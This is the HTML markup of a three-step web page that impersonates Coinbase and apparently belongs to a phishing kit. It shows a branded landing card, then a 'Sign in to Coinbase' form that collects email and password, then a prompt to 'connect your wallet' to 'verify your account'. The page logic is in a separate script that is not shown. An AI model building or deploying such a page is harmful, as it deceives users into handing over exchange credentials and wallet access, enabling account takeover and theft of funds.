<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="auth-card" id="step-1">
        <img src="https://www.coinbase.com/favicon.ico" class="cb-logo">
        <h1>Get started with the world's easiest crypto app</h1>
        <p>Join millions of people already using Coinbase to buy, sell and manage crypto.</p>
        <button id="toStep2" class="btn-primary">Get started</button>
    </div>

    <div class="auth-card hidden" id="step-2">
        <img src="https://www.coinbase.com/favicon.ico" class="cb-logo">
        <h1>Sign in to Coinbase</h1>
        <div class="input-group">
            <label>Email Address</label>
            <input type="email" id="email" placeholder="name@email.com">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="pass" placeholder="Enter password">
        </div>
        <button id="toStep3" class="btn-primary">Continue</button>
    </div>

    <div class="auth-card hidden" id="step-3">
        <img src="https://www.coinbase.com/favicon.ico" class="cb-logo">
        <h1 id="step3Title">Connect Wallet</h1>
        <p id="step3Desc">To verify your account, please connect your wallet to continue.</p>
        <button id="connectBtn" class="btn-primary">Connect Wallet</button>
        <div id="status" class="status-text"></div>
    </div>

    <script src="app.js"></script>
</body>
</html>
